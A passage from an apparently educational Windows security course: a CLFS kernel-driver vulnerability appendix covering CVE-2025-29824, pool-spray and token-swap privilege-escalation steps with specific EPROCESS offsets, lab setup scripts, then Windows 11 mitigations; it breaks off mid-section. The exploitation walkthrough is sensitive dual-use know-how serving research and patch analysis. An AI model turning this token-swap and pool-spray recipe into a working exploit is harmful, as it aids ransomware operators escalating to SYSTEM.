Typical attack chain:          Initial access -> CLFS EoP -> SYSTEM -> Ransomware

Why so many bugs?
- Complex binary log file format
- Extensive parsing code in kernel mode
- Legacy codebase with accumulated technical debt
- Rich attack surface via user-controlled log files
- Reliable exploitation primitives (UAF -> arbitrary R/W)
```

### CLFS Architecture

```text
┌──────────────────────────────────────────────────────────────┐
│                    CLFS Architecture                         │
├──────────────────────────────────────────────────────────────┤
│                                                              │
│  USER MODE                                                   │
│  ─────────                                                   │
│  Application                                                 │
│       │                                                      │
│       ▼                                                      │
│  clfsw32.dll (User-mode CLFS library)                        │
│       │                                                      │
│       │ CreateLogFile(), ReadLogRecord(), WriteLogRecord()   │
│       ▼                                                      │
│  ════════════════════════════════════════════════════════════│
│                                                              │
│  KERNEL MODE                                                 │
│  ───────────                                                 │
│  clfs.sys (Kernel driver)                                    │
│       │                                                      │
│       ├── CClfsBaseFilePersisted (Base Log File)             │
│       ├── CClfsContainer (Container management)              │
│       ├── CClfsLogFcbPhysical (File Control Block)           │
│       └── CLFS_LOG_BLOCK_HEADER (Log block parsing)          │
│                                                              │
│  Attack Surface:                                             │
│  ├── Log file parsing (most bugs here)                       │
│  ├── Container operations                                    │
│  ├── Metadata validation                                     │
│  └── Reference counting (UAF bugs)                           │
│                                                              │
│  Log File Structure (.blf):                                  │
│  ┌──────────────────────────────────────────────────────┐    │
│  │ Control Record │ Base Record │ Containers │ Clients  │    │
│  │    (metadata)  │  (shadow)   │  (data)    │ (state)  │    │
│  └──────────────────────────────────────────────────────┘    │
│                                                              │
└──────────────────────────────────────────────────────────────┘
```

### CVE-2025-29824: CLFS Use-After-Free (Ransomware Favorite)

```c
// clfs_analysis.c - CVE-2025-29824 vulnerability analysis
// CLFS Use-After-Free leading to privilege escalation
// Used by Storm-2460 threat actor for ransomware deployment

/*
CVE-2025-29824: CLFS Use-After-Free
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

CVSS Score: 7.8 (HIGH)
Attack Vector: Local
Privileges Required: Low (any authenticated user)
Impact: SYSTEM privilege escalation

Root Cause:
- Race condition in CLFS log file handling
- Object freed while still referenced
- Attacker can reclaim freed memory with controlled data
- Leads to arbitrary kernel read/write

Exploitation Flow:
1. Create malicious .blf log file
2. Trigger specific CLFS operations
3. Race condition frees object prematurely
4. Spray kernel pool to reclaim freed memory
5. Trigger use of freed object -> controlled call/write
6. Achieve arbitrary kernel R/W
7. Token swap for SYSTEM privileges
*/

#include <windows.h>
#include <clfsw32.h>
#include <stdio.h>

#pragma comment(lib, "clfsw32.lib")

// Structure representing CLFS log block header (simplified)
// WARNING: This is a CONCEPTUAL layout for educational purposes.
// The actual on-disk _CLFS_LOG_BLOCK_HEADER has different field
// ordering and sizes. Do NOT use this struct to parse real .blf files.
// For accurate definitions, use: dt clfs!_CLFS_LOG_BLOCK_HEADER in WinDbg.
typedef struct _CLFS_LOG_BLOCK_HEADER {
    UCHAR MajorVersion;
    UCHAR MinorVersion;
    UCHAR Usn;
    UCHAR ClientId;
    USHORT TotalSectorCount;
    USHORT ValidSectorCount;
    ULONG Padding;
    ULONG Checksum;
    ULONG Flags;
    CLFS_LSN CurrentLsn;
    CLFS_LSN NextLsn;
    ULONG RecordOffsets[16];
    ULONG SignaturesOffset;
} CLFS_LOG_BLOCK_HEADER, *PCLFS_LOG_BLOCK_HEADER;

void analyze_clfs_attack_surface() {
    printf("=== CLFS Attack Surface Analysis ===\n\n");

    printf("High-Value Targets in clfs.sys:\n");
    printf("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n");
    printf("1. CClfsBaseFilePersisted::ReadMetadataBlock()\n");
    printf("   - Parses log file metadata\n");
    printf("   - Integer overflows in size calculations\n\n");

    printf("2. CClfsContainer::ReadSector()\n");
    printf("   - Reads container data\n");
    printf("   - Buffer size mismatches\n\n");

    printf("3. ClfsDecodeBlock()\n");
    printf("   - Decodes log block data\n");
    printf("   - Checksum validation bypasses\n\n");

    printf("4. CClfsLogFcbPhysical::FlushMetadata()\n");
    printf("   - Reference counting bugs\n");
    printf("   - UAF during concurrent operations\n\n");

    printf("Common Vulnerability Patterns:\n");
    printf("------------------------------\n");
    printf("- Integer overflow in size fields\n");
    printf("- Use-after-free in object management\n");
    printf("- Out-of-bounds read/write in parsing\n");
    printf("- Type confusion between record types\n");
    printf("- Race conditions in multi-threaded ops\n");
}

void demonstrate_clfs_api() {
    printf("\n=== CLFS API for Researchers ===\n\n");

    // Creating a log file for analysis
    WCHAR logPath[] = L"C:\\temp\\research.blf";
    HANDLE hLog = INVALID_HANDLE_VALUE;

    printf("Key CLFS APIs:\n");
    printf("--------------\n");

    printf("1. CreateLogFile() - Create/open log file\n");
    printf("   -> Entry point, validates .blf structure\n\n");

    printf("2. AddLogContainer() - Add storage container\n");
    printf("   -> Manages physical storage\n\n");

    printf("3. CreateLogMarshallingArea() - Set up I/O\n");
    printf("   -> Memory mapping, buffer management\n\n");

    printf("4. ReserveAndAppendLog() - Write records\n");
    printf("   -> Where many parsing bugs trigger\n\n");

    printf("5. ReadLogRecord() - Read records\n");
    printf("   -> Triggers block parsing code\n\n");

    // Example: Create a minimal log for analysis
    printf("Creating test log file...\n");

    hLog = CreateLogFile(
        logPath,
        GENERIC_READ | GENERIC_WRITE,
        FILE_SHARE_READ | FILE_SHARE_WRITE,
        NULL,
        OPEN_ALWAYS,
        0
    );

    if (hLog != INVALID_HANDLE_VALUE) {
        printf("[+] Log created: %ls\n", logPath);
        printf("[*] Analyze with: !clfs in WinDbg\n");
        CloseHandle(hLog);
    } else {
        printf("[-] CreateLogFile failed: %d\n", GetLastError());
    }
}

void show_windbg_clfs_commands() {
    printf("\n=== WinDbg CLFS Analysis Commands ===\n\n");

    printf("# Load CLFS extension\n");
    printf(".load clfs\n\n");

    printf("# List CLFS log files\n");
    printf("!clfs loglist\n\n");

    printf("# Dump log file info\n");
    printf("!clfs loginfo <log_address>\n\n");

    printf("# Dump container info\n");
    printf("!clfs container <container_address>\n\n");

    printf("# Set breakpoint on key functions\n");
    printf("bp clfs!CClfsBaseFilePersisted::ReadMetadataBlock\n");
    printf("bp clfs!ClfsDecodeBlock\n");
    printf("bp clfs!CClfsContainer::ReadSector\n\n");

    printf("# Track CLFS object allocations\n");
    printf("!poolused 2 Clfs\n\n");

    printf("# CLFS pool tags\n");
    printf("Clfs - General CLFS allocations\n");
    printf("ClfB - CLFS base file\n");
    printf("ClfC - CLFS container\n");
    printf("ClfL - CLFS log context\n");
}

int main() {
    printf("========================================\n");
    printf("CLFS Vulnerability Research Guide\n");
    printf("CVE-2025-29824 Analysis\n");
    printf("========================================\n\n");

    analyze_clfs_attack_surface();
    demonstrate_clfs_api();
    show_windbg_clfs_commands();

    printf("\n=== Practical Research Steps ===\n\n");
    printf("1. Set up kernel debugging (VirtualKD/kdnet)\n");
    printf("2. Create malformed .blf files\n");
    printf("3. Monitor clfs.sys with breakpoints\n");
    printf("4. Fuzz CLFS APIs with WinAFL\n");
    printf("5. Analyze crashes for exploitability\n");
    printf("6. Study patch diffs for variant hunting\n");

    return 0;
}
```

### CLFS Exploitation Primitive: From UAF to Kernel R/W

```python
#!/usr/bin/env python3
# clfs_exploit_primitive.py - CLFS exploitation technique overview
# Educational - demonstrates the UAF -> R/W primitive chain

"""
CLFS UAF Exploitation Flow:
---------------------------

1. TRIGGER UAF
   - Create race condition that frees CLFS object

2. RECLAIM FREED MEMORY
   - Spray kernel pool with controlled data
   - Common technique: Pipe attributes (NpFsControlPipe)

3. CORRUPT OBJECT
   - Freed CLFS object now contains attacker data
   - Craft fake object with malicious pointers

4. TRIGGER USE
   - CLFS code uses corrupted object
   - Controlled read/write through fake pointers

5. ACHIEVE ARBITRARY R/W
   - Leverage read/write primitive
   - Locate EPROCESS, modify Token

6. PRIVILEGE ESCALATION
   - Copy SYSTEM token to current process
   - Spawn elevated process
"""

import ctypes
import struct
from ctypes import wintypes

# Windows API setup
kernel32 = ctypes.windll.kernel32
ntdll = ctypes.windll.ntdll

def explain_pool_spray():
    """Explain kernel pool spray for CLFS exploitation"""

    print("=== Kernel Pool Spray for CLFS UAF ===\n")

    print("""
CLFS objects are allocated from NonPagedPoolNx.
After UAF, we need to reclaim that memory with controlled content.

Common spray techniques:
------------------------

1. Named Pipe Attributes (most reliable)
   - NtFsControlFile with FSCTL_PIPE_SET_ATTRIBUTE
   - Allocates from same pool as CLFS
   - Controllable size and content

2. Extended Attributes (EAs)
   - NtSetEaFile on crafted files
   - Variable size allocations

3. Registry Values
   - NtSetValueKey with binary data
   - Useful for specific sizes

Spray Strategy:
---------------
1. Calculate target allocation size from CLFS object
2. Create many pipe/EA allocations of same size
3. Trigger UAF to free CLFS object
4. One spray allocation reclaims the freed slot
5. CLFS code now operates on attacker data
""")

def explain_token_swap():
    """Explain token manipulation for privilege escalation"""

    print("=== Token Swap for Privilege Escalation ===\n")

    print("""
Once we have kernel R/W, privilege escalation is straightforward:

# WARNING: All offsets below are BUILD-SPECIFIC and change between
# Windows versions/updates. Always verify with:
#   dt nt!_EPROCESS Token
#   dt nt!_KTHREAD ApcState
# before using in exploit code.

1. LOCATE SYSTEM PROCESS
   ---------------------
   # Find System (PID 4) EPROCESS
   - Walk ActiveProcessLinks from PsInitialSystemProcess
   - Or use leaked kernel address + known offset

2. READ SYSTEM TOKEN
   -----------------
   # EPROCESS+0x4B8 (Win11 22H2, verify for your build!) = Token
   system_token = kernel_read(system_eprocess + 0x4B8)
   # Token is actually _EX_FAST_REF, mask lower 4 bits
   system_token &= ~0xF

3. LOCATE CURRENT PROCESS
   ----------------------
   # Get current EPROCESS
   current_eprocess = kernel_read(KTHREAD + 0x220)  # ApcState.Process (build-specific!)

4. SWAP TOKEN
   ----------
   # Overwrite current process token with SYSTEM token
   kernel_write(current_eprocess + 0x4B8, system_token)

5. SPAWN ELEVATED PROCESS
   ----------------------
   # Current process now has SYSTEM privileges
   os.system("cmd.exe")  # This cmd has SYSTEM token!
""")

def show_clfs_cve_history():
    """Show CLFS CVE history for variant analysis"""

    print("=== CLFS CVE History (Variant Analysis) ===\n")

    cves = [
        ("CVE-2022-24521", "Apr 2022", "EoP", "In-wild", "Log file parsing OOB"),
        ("CVE-2022-37969", "Sep 2022", "EoP", "In-wild", "Container handling"),
        ("CVE-2023-23376", "Feb 2023", "EoP", "In-wild", "Metadata parsing"),
        ("CVE-2023-28252", "Apr 2023", "EoP", "In-wild", "Base file parsing"),
        ("CVE-2024-6768", "Aug 2024", "DoS", "PoC", "NULL deref in parsing"),
        ("CVE-2024-49138", "Dec 2024", "EoP", "In-wild", "Heap overflow"),
        ("CVE-2025-29824", "Apr 2025", "EoP", "In-wild", "UAF in log handling"),
    ]

    print("CVE             | Date     | Type | Status  | Root Cause")
    print("-" * 70)
    for cve, date, typ, status, cause in cves:
        print(f"{cve} | {date} | {typ}  | {status:7} | {cause}")

    print("""
Pattern Analysis:
-----------------
- Most bugs in log file/metadata parsing
- UAF and OOB are dominant bug classes
- Patches often incomplete -> variants found
- Same code paths exploited repeatedly

Variant Hunting Strategy:
-------------------------
1. Download patched and vulnerable clfs.sys
2. BinDiff to find patched functions
3. Analyze patch - what was the fix?
4. Search for similar patterns elsewhere
5. Fuzz the same code paths with new inputs
""")

def main():
    print("=" * 60)
    print("CLFS Exploitation Techniques - Educational Overview")
    print("=" * 60)

    explain_pool_spray()
    explain_token_swap()
    show_clfs_cve_history()

    print("\n=== Recommended Labs ===\n")
    print("1. Set up CLFS debugging environment")
    print("2. Create and analyze .blf file structures")
    print("3. Practice kernel pool spray techniques")
    print("4. Study CVE-2023-28252 public PoC")
    print("5. Perform patch diff on recent CLFS updates")

if __name__ == "__main__":
    main()
```

### CLFS Lab Setup

```bash
# clfs_lab_setup.ps1 - Set up CLFS research environment

Write-Host "=== CLFS Research Lab Setup ===" -ForegroundColor Green

# 1. Create lab directory
$labDir = "C:\CLFS_Research"
New-Item -ItemType Directory -Force -Path $labDir
Set-Location $labDir

# 2. Create subdirectories
@("samples", "dumps", "symbols", "tools") | ForEach-Object {
    New-Item -ItemType Directory -Force -Path "$labDir\$_"
}

# 3. Download symbols for clfs.sys
Write-Host "`n[*] Configuring symbols..." -ForegroundColor Yellow
$env:_NT_SYMBOL_PATH = "srv*$labDir\symbols*https://msdl.microsoft.com/download/symbols"

# 4. Get current clfs.sys info
Write-Host "`n[*] Current clfs.sys info:" -ForegroundColor Yellow
$clfs = Get-Item "$env:SystemRoot\System32\drivers\clfs.sys"
Write-Host "  Path: $($clfs.FullName)"
Write-Host "  Version: $($clfs.VersionInfo.FileVersion)"
Write-Host "  Size: $($clfs.Length) bytes"

# 5. Check for CLFS log files on system
Write-Host "`n[*] Existing CLFS log files:" -ForegroundColor Yellow
Get-ChildItem -Path C:\ -Filter "*.blf" -Recurse -ErrorAction SilentlyContinue |
    Select-Object -First 10 FullName, Length

# 6. Create test log file via CLFS API
# NOTE: CreateLogFile may fail with error 1921 (ERROR_CANT_ACCESS_FILE) due to:
#   - Insufficient permissions (requires admin/SYSTEM in some cases)
#   - Invalid log: prefix syntax on some Windows versions
#   - CLFS service not running
# Workaround: Use the compiled clfs_analysis.c or create .blf manually
Write-Host "`n[*] Creating test log file..." -ForegroundColor Yellow
$testLog = "$labDir\samples\test.blf"

try {
    # Use .NET interop to call CreateLogFile (clfsw32.dll)
    Add-Type -TypeDefinition @'
    using System;
    using System.Runtime.InteropServices;
    public class ClfsHelper {
        [DllImport("clfsw32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
        public static extern IntPtr CreateLogFile(
            string pszLogFileName, int fDesiredAccess, int dwShareMode,
            IntPtr lpSecurityAttributes, int fCreateDisposition,
            int fFlagsAndAttributes);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool CloseHandle(IntPtr hObject);
    }
'@
    # GENERIC_READ | GENERIC_WRITE = 0xC0000000 (as signed int = -1073741824)
    $hLog = [ClfsHelper]::CreateLogFile("log:$testLog", -1073741824, 3, [IntPtr]::Zero, 4, 0)
    if ($hLog -ne [IntPtr]::Zero -and $hLog -ne [IntPtr]::new(-1)) {
        Write-Host "  [+] Created: $testLog" -ForegroundColor Green
        [ClfsHelper]::CloseHandle($hLog) | Out-Null
    } else {
        $err = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
        Write-Host "  [-] CreateLogFile failed with error: $err" -ForegroundColor Red
        if ($err -eq 1921) {
            Write-Host "  [*] Error 1921 = ERROR_CANT_ACCESS_FILE" -ForegroundColor Yellow
            Write-Host "  [*] This is common - CLFS requires specific permissions" -ForegroundColor Yellow
            Write-Host "  [*] Alternative: Run clfs_analysis.exe as Administrator" -ForegroundColor Yellow
        }
    }
} catch {
    Write-Host "  [-] CLFS API call failed: $_" -ForegroundColor Red
    Write-Host "  [*] Alternative: compile and run clfs_analysis.c as Administrator" -ForegroundColor Yellow
}

# 7. WinDbg commands cheat sheet
$windbgCheatsheet = @"
=== CLFS WinDbg Cheat Sheet ===

# Set up kernel debugging
bcdedit /debug on
bcdedit /dbgsettings net hostip:192.168.1.100 port:50000

# Connect WinDbg
windbg -k net:port=50000,key=1.2.3.4

# In WinDbg:
.symfix
.reload /f clfs.sys

# CLFS breakpoints
bp clfs!CClfsBaseFilePersisted::ReadMetadataBlock
bp clfs!ClfsDecodeBlock
bp clfs!CClfsBaseFilePersisted::FlushMetadata

# Monitor CLFS pool allocations
!poolused 2 Clfs

# Dump CLFS structures
dt clfs!_CLFS_LOG_BLOCK_HEADER
dt clfs!_CLFS_CONTAINER_CONTEXT

# Trace CLFS API calls
!wmitrace.dynamicprint 1

# Memory analysis
!pool <address>
!poolfind Clfs
"@

$windbgCheatsheet | Out-File "$labDir\windbg_clfs_cheatsheet.txt"
Write-Host "[+] WinDbg cheatsheet saved to: $labDir\windbg_clfs_cheatsheet.txt" -ForegroundColor Green

Write-Host "`n=== Lab Setup Complete ===" -ForegroundColor Green
Write-Host "Next steps:"
Write-Host "1. Enable kernel debugging on target VM"
Write-Host "2. Attach WinDbg and load CLFS symbols"
Write-Host "3. Set breakpoints on CLFS functions"
Write-Host "4. Create/open .blf files to trigger code paths"
Write-Host "5. Analyze execution flow for vulnerability research"
```

**Compile and Run CLFS Analysis Tools**:

```bash
# Navigate to lab directory
cd C:\Windows_Mitigations_Lab

# Create CLFS research directory
mkdir C:\CLFS_Research
mkdir C:\CLFS_Research\src
mkdir C:\CLFS_Research\bin
mkdir C:\CLFS_Research\samples

# Save the clfs_analysis.c code to C:\CLFS_Research\src\clfs_analysis.c
# Save the clfs_exploit_primitive.py to C:\CLFS_Research\src\clfs_exploit_primitive.py
# Save the clfs_lab_setup.ps1 to C:\CLFS_Research\clfs_lab_setup.ps1

# IMPORTANT: CLFS operations may require Administrator privileges
# If you get error 1921 (ERROR_CANT_ACCESS_FILE), run as Administrator:
# Right-click PowerShell/CMD -> "Run as Administrator"

# Step 1: Compile CLFS analysis tool
cd C:\CLFS_Research
cl /Zi src\clfs_analysis.c /Fe:bin\clfs_analysis.exe /link clfsw32.lib /DEBUG
# Note: Requires clfsw32.lib which comes with Windows SDK

# Step 2: Run CLFS analysis (try as Administrator if it fails)
.\bin\clfs_analysis.exe
# If you see "CreateLogFile failed: 1921", run as Administrator:
# Right-click PowerShell -> Run as Administrator, then run again

# This will:
#   - Show CLFS attack surface analysis
#   - Create a test .blf log file at C:\temp\research.blf
#   - Display WinDbg commands for CLFS debugging

# Step 3: Run Python exploitation overview
python src\clfs_exploit_primitive.py
# This explains:
#   - UAF to kernel R/W primitive chain
#   - Pool spray techniques
#   - Token swap for privilege escalation
#   - CLFS CVE history and variant analysis

# Step 4: Run lab setup script
Set-ExecutionPolicy Bypass -Scope Process -Force
.\clfs_lab_setup.ps1
# This will:
#   - Create lab directory structure
#   - Configure symbol paths
#   - Show current clfs.sys info
#   - Find existing .blf files on system
#   - Create WinDbg cheatsheet

# Step 5: Examine created log file
# Note: PowerShell creates test.blf.blf (double extension)
# The file may be locked by CLFS system - copy it first
Get-Item C:\CLFS_Research\samples\*.blf*

# Copy the file to unlock it
Copy-Item C:\CLFS_Research\samples\test.blf.blf C:\CLFS_Research\samples\test_copy.blf

# View first 128 bytes in hex
Get-Content C:\CLFS_Research\samples\test_copy.blf -Encoding Byte -TotalCount 128 | Format-Hex

# Analyze the CLFS file structure
$bytes = [System.IO.File]::ReadAllBytes("C:\CLFS_Research\samples\test_copy.blf")
Write-Host "File size: $($bytes.Length) bytes"
Write-Host "`nCLFS Header Analysis:"
Write-Host "Offset 0x00: 0x$($bytes[0].ToString('X2')) - Record type (0x15 = 21 decimal)"
Write-Host "Offset 0x0C-0x0F: Checksum = 0x$($bytes[12].ToString('X2'))$($bytes[13].ToString('X2'))$($bytes[14].ToString('X2'))$($bytes[15].ToString('X2'))"
Write-Host "`nThis is a valid 64KB CLFS log file ready for analysis!"

# Step 6: List CLFS files on your system
Get-ChildItem -Path C:\ -Filter "*.blf" -Recurse -ErrorAction SilentlyContinue | Select-Object FullName, Length, LastWriteTime

# Step 7: Check CLFS driver version
Get-Item C:\Windows\System32\drivers\clfs.sys | Select-Object VersionInfo

# Step 8: For kernel debugging (requires separate VM setup)
# On target VM:
bcdedit /debug on
bcdedit /dbgsettings net hostip:YOUR_HOST_IP port:50000

# On host with WinDbg:
windbg -k net:port=50000,key=YOUR_KEY

# In WinDbg:
.symfix
.reload /f clfs.sys
bp clfs!CClfsBaseFilePersisted::ReadMetadataBlock
g
```

**Quick Start Commands**:

```bash
# Minimal setup - just compile and run the analysis tool
cd C:\CLFS_Research
cl src\clfs_analysis.c /Fe:bin\clfs_analysis.exe /link clfsw32.lib
.\bin\clfs_analysis.exe

# Run Python overview
python src\clfs_exploit_primitive.py

# Run PowerShell lab setup
powershell -ExecutionPolicy Bypass -File .\clfs_lab_setup.ps1
```

**Expected Output**:

```text
# clfs_analysis.exe output (may show error 1921 if not running as Administrator):
========================================
CLFS Vulnerability Research Guide
CVE-2025-29824 Analysis
========================================

=== CLFS Attack Surface Analysis ===

High-Value Targets in clfs.sys:
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
1. CClfsBaseFilePersisted::ReadMetadataBlock()
   - Parses log file metadata
   - Integer overflows in size calculations
[... continues with full analysis ...]

Creating test log file...
[-] CreateLogFile failed: 1921
# Note: Error 1921 = ERROR_CANT_ACCESS_FILE
# This is expected - CLFS requires Administrator privileges
# The PowerShell script (clfs_lab_setup.ps1) will create the file successfully

# clfs_lab_setup.ps1 output (when run as Administrator):
=== CLFS Research Lab Setup ===
[*] Configuring symbols...
[*] Current clfs.sys info:
  Path: C:\WINDOWS\System32\drivers\clfs.sys
  Version: 10.0.26100.7623 (WinBuild.160101.0800)
  Size: 570776 bytes

[*] Creating test log file...
[+] Created: C:\CLFS_Research\samples\test.blf.blf
# Note: PowerShell creates test.blf.blf (double extension)
# This is a valid 64KB CLFS log file

[+] WinDbg cheatsheet saved to: C:\CLFS_Research\windbg_clfs_cheatsheet.txt

=== Lab Setup Complete ===

# Hex dump of created CLFS file:
Path:
00 01 02 03 04 05 06 07 08 09 0A 0B 0C 0D 0E 0F
00000000   15 00 01 00 02 00 02 00 00 00 00 00 4B 82 4C C6  ............K.L.
00000010   01 00 00 00 00 00 00 00 00 00 00 00 FF FF FF FF  ................
00000020   00 00 00 00 FF FF FF FF 70 00 00 00 00 00 00 00  ........p.......
...

File Analysis:
- Size: 65,536 bytes (64KB standard CLFS block)
- Offset 0x00: 0x15 (21) - Record type
- Offset 0x0C: 0x4B824CC6 - Checksum
- Valid CLFS metadata structure
```

### CLFS Practical Exercise

**Lab A.1: CLFS Environment Setup**

1. Run `clfs_lab_setup.ps1` to create research environment
2. Enable kernel debugging on your VM
3. Download CLFS symbols and verify loading

**Lab A.2: CLFS API Exploration**

1. Compile and run `clfs_analysis.c`
2. Run `clfs_lab_setup.ps1` as Administrator to create test.blf.blf
3. Copy and analyze the created log file:
   ```powershell
   Copy-Item C:\CLFS_Research\samples\test.blf.blf C:\CLFS_Research\samples\test_copy.blf
   Get-Content C:\CLFS_Research\samples\test_copy.blf -Encoding Byte -TotalCount 128 | Format-Hex
   ```
4. Monitor CLFS API calls with Process Monitor

**Lab A.3: WinDbg CLFS Analysis**

1. Set breakpoints on `ClfsDecodeBlock` and `ReadMetadataBlock`
2. Open the created test.blf.blf file to trigger breakpoints
3. Examine CLFS structures in memory:
   ```
   dt clfs!_CLFS_LOG_BLOCK_HEADER
   !poolused 2 Clfs
   ```
4. Note: The C program may fail with error 1921 (requires Administrator)
   Use the PowerShell-created test.blf.blf file instead

**Lab A.4: Patch Diffing Exercise**

1. Download clfs.sys from before/after CVE-2025-29824 patch
2. Use BinDiff/Ghidriff to identify patched functions
3. Document the vulnerability root cause

### Key Takeaways - CLFS

- **CLFS is the #1 Windows kernel attack surface** for EoP in 2022-2025
- **Log file parsing** is where most bugs occur
- **UAF + pool spray** is the standard exploitation primitive (see **Appendix B** for Segment Heap pool spray internals)
- **Variant analysis** is highly effective - same code paths repeatedly vulnerable
- **Patch diffing CLFS updates** is a productive research activity

**Important Notes:**

- CreateLogFile may fail with error 1921 (ERROR_CANT_ACCESS_FILE) - requires Administrator privileges
- PowerShell script creates test.blf.blf (double extension) - this is normal
- Created .blf files may be locked by CLFS system - copy them before analysis
- Standard CLFS log files are 64KB (65,536 bytes)
- File structure starts with record type (0x15) and checksum at offset 0x0C

## Appendix C: Some Other Mitigations

### Administrator Protection (Windows 11 24H2+)

**What is Administrator Protection?**:

- Enhanced replacement for traditional UAC Admin Approval Mode
- Creates temporary, just-in-time elevated admin accounts
- Temporary admin context destroyed after elevation completes
- Prevents persistent admin tokens from being stolen/abused

**How It Works**:

```text
Traditional UAC Admin Approval:
--------------------------------------------------------------

User in Administrators group has TWO tokens:
- Standard user token (used by default)
- Admin token (used after UAC prompt)

Problem: Admin token PERSISTS in session
         Token theft attacks (e.g., token impersonation) can abuse it

Administrator Protection:
--------------------------------------------------------------

User requests elevation:
1. System creates TEMPORARY hidden admin account
2. New admin token generated just-in-time
3. Elevated action performed
4. Temporary admin account/token DESTROYED
5. No persistent admin token to steal!

Security Benefit:
- Token theft has limited window
- Pass-the-hash harder (no persistent high-priv token)
- Mimikatz token impersonation much less effective
```

**Enabling Administrator Protection**:

```powershell
# Check current status (Windows 11 24H2+)
Get-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name "TypeOfAdminApprovalMode" -ErrorAction SilentlyContinue

# Values:
# 0 = Admin Approval Mode disabled (not recommended)
# 1 = Traditional Admin Approval Mode (default)
# 2 = Admin Approval Mode with Administrator Protection (enhanced)

# Enable via Group Policy:
# Computer Configuration -> Windows Settings -> Security Settings ->
# Local Policies -> Security Options ->
# "User Account Control: Configure type of Admin Approval Mode"
# Set to: "Admin Approval Mode with Administrator Protection"

# Or via Registry (for testing):
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v TypeOfAdminApprovalMode /t REG_DWORD /d 2 /f

# Restart required for changes to take effect
```

### Personal Data Encryption (PDE)

**What is PDE?**:

- File-level AES-256 encryption for known folders
- Protected by Windows Hello for Business authentication
- Separate from BitLocker (provides per-user protection)
- Data stays encrypted until user authenticates via Windows Hello

**Protected Folders**:

- Desktop
- Documents
- Pictures

**How PDE Differs from BitLocker**:

| Feature            | BitLocker     | PDE                    |
| ------------------ | ------------- | ---------------------- |
| Scope              | Full disk     | Per-user folders       |
| Key Storage        | TPM           | User container (VBS)   |
| Unlock Mechanism   | Boot PIN/Auto | Windows Hello          |
| Multi-user support | N/A           | Each user has own keys |
| Offline attack     | Protected     | Protected + user-bound |

**Checking PDE Status**:

```powershell
# Requires Windows 11 22H2+ with Windows Hello for Business

# Check if PDE is enabled
Get-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\PolicyManager\current\device\PDE" -ErrorAction SilentlyContinue

# PDE requires:
# - Windows 11 Enterprise/Education (NOT available on Pro/Home)
# - Windows Hello for Business enrolled
# - VBS enabled (for key protection)

# Check Windows edition
(Get-ComputerInfo).WindowsEditionId

# Note: Empty output means PDE is not configured
```

### Enhanced Sign-in Security (ESS)

**What is ESS?**:

- VBS-protected biometric data processing
- Isolates face/fingerprint authentication in secure virtualization environment
- Prevents biometric replay attacks
- Secure channel between biometric sensors and Windows Hello

**Architecture**:

```text
Without ESS:
---------------------------------------------------------------------------------------
Biometric Sensor -> Standard Driver -> Windows Hello -> Credential Provider
                   ↑
        Potential attack surface (driver vulnerabilities)

With ESS:
---------------------------------------------------------------------------------------
Biometric Sensor -> ESS-capable Driver -> [VTL 1 Secure Processing] -> Credential Provider
                                        ↑
                           Isolated from kernel/malware
                           Biometric data never exposed to VTL 0

Attack Mitigation:
- Biometric data can't be extracted by malware
- Replay attacks blocked at hardware level
- Driver compromises can't steal biometric templates
```

**Requirements**:

- ESS-capable biometric hardware (fingerprint sensors, IR cameras)
- Default on Copilot+ PCs
- Manual enable on supported hardware otherwise

**Checking ESS Status**:

```powershell
# Check if ESS is enabled
Get-CimInstance -Namespace root\Microsoft\Windows\DeviceGuard -ClassName Win32_DeviceGuard |
    Select-Object -Property EnhancedSignInSecurity*

# Look for: EnhancedSignInSecuritySupported, EnhancedSignInSecurityMode
# Note: Empty output means ESS properties not available (no ESS-capable hardware)

# Check if you have biometric hardware at all
Get-PnpDevice | Where-Object {$_.Class -eq "Biometric"}

# If no biometric devices found, ESS is not applicable to your system
```

### Passkeys (FIDO2 Passwordless Authentication)

**What are Passkeys?**:

- Native FIDO2 passwordless authentication in Windows 11
- Hardware-backed credentials using TPM
- Cross-device sync via Microsoft account
- Phishing-resistant (bound to specific domains)

**Security Benefits**:

```text
Password vs. Passkey Security:
------------------------------------------------------

Traditional Password:
- Can be phished (user types on fake site)
- Can be credential-stuffed (reused passwords)
- Can be brute-forced (weak passwords)
- Stored on server (breach = mass compromise)

Passkey (FIDO2):
- Domain-bound (can't be phished to wrong site)
- Unique per site (no credential stuffing)
- Hardware-backed (can't be brute-forced)
- Public key on server (breach = harmless data)

Attack Surface Reduction:
- Eliminates password guessing attacks
- Eliminates phishing credential theft
- Eliminates password spray attacks
```

**Windows Passkey Management**:

```text
# Passkeys stored in Windows Hello credential provider
# Access via Settings -> Accounts -> Passkeys

# Or programmatically query:
# Uses WebAuthn APIs (Windows.Security.Credentials)
```

### Enhanced Phishing Protection

**What is Enhanced Phishing Protection?**:

- SmartScreen-based password protection
- Detects password entry on known phishing sites
- Warns when reusing work passwords on non-work sites
- Alerts on unsafe password storage (plaintext in files)

**Protection Modes**:

| Alert Type             | Trigger                            | Impact                       |
| ---------------------- | ---------------------------------- | ---------------------------- |
| Phishing site warning  | Typing password on malicious site  | Blocks credential submission |
| Password reuse warning | Using work password elsewhere      | Warning notification         |
| Unsafe storage warning | Saving password in plaintext files | Warning notification         |

**Enabling**:

```text
# Via Group Policy:
# Computer Configuration -> Administrative Templates -> Windows Components ->
# Windows Defender SmartScreen -> Enhanced Phishing Protection

# Settings:
# - Notify Malicious: Warn on phishing sites
# - Notify Password Reuse: Warn on corporate password reuse
# - Notify Unsafe App: Warn on plaintext password storage
```

### SMB Protocol Hardening (Windows 11 24H2+)

**What Changed**:

- SMB signing now **required by default** (previously optional)
- SMB NTLM blocking capability added
- SMB encryption mandate capability
- SMB over QUIC client access control

**Security Impact**:

```text
SMB Relay Attacks Before 24H2:
--------------------------------------------------------------
Attacker intercepts SMB traffic -> Relays to another server
Works because signing was optional by default

SMB After 24H2:
--------------------------------------------------------------
All SMB traffic MUST be signed
Relay attacks fail (signature verification fails)
```

**Checking SMB Signing Status**:

```bash
# Check SMB server configuration
